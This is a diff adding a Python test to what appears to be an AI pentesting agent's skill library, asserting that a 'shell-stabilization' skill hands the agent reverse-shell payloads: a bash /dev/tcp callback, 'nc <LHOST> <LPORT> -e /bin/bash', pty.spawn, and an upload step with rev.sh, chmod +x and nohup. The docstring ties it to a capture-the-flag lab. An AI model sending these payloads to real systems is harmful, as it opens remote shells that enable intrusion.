@@ -108,6 +108,38 @@ def test_methodology_skill_orders_enumeration_before_attack() -> None:
     assert "enumeración" in line
 
 
+def test_shell_stabilization_skill_stops_the_webshell_compile_loop() -> None:
+    """The recipe the model lacked in Vulnversity: 35 turns compiling by curl.
+
+    A webshell is one command per request: no TTY, no stdin, no state. The skill
+    must say the golden rule out loud and give the two governed ways to get a
+    real interactive shell, with a payload the model can copy.
+    """
+    skill = load_skill("shell-stabilization", REPO_ROOT)
+    assert skill is not None and skill.usable
+    flat = " ".join(skill.content.split())
+    assert (
+        "Si tienes un RCE por webshell (curl), NO intentes compilar código." in flat
+    )
+    assert "shell interactiva real para escalar privilegios" in flat
+
+    # The way out is a tool the agent actually has, not an abstraction.
+    for tool_id in ("nexus.post.listener", "nexus.session.pty"):
+        assert tool_id in skill.content
+    # And the payloads it can send: bash, nc and python.
+    assert "/dev/tcp/<LHOST>/" in skill.content
+    assert "nc <LHOST> <LPORT> -e /bin/bash" in skill.content
+    assert "pty.spawn" in skill.content
+    # The upload path is spelled out: script + chmod + nohup (one shot).
+    assert "rev.sh" in skill.content
+    assert "nohup" in skill.content and "chmod +x" in skill.content
+
+    # It reaches the model: the prompt carries a one-line index entry.
+    index = render_skill_index(discover_skills(REPO_ROOT))
+    line = next(line for line in index.splitlines() if "- shell-stabilization:" in line)
+    assert "reverse shell" in line or "webshell" in line
+
+
 def _write_skill(root: Path, name: str, body: str) -> Path:
     directory = root / ".agents" / "skills" / name
     directory.mkdir(parents=True, exist_ok=True)
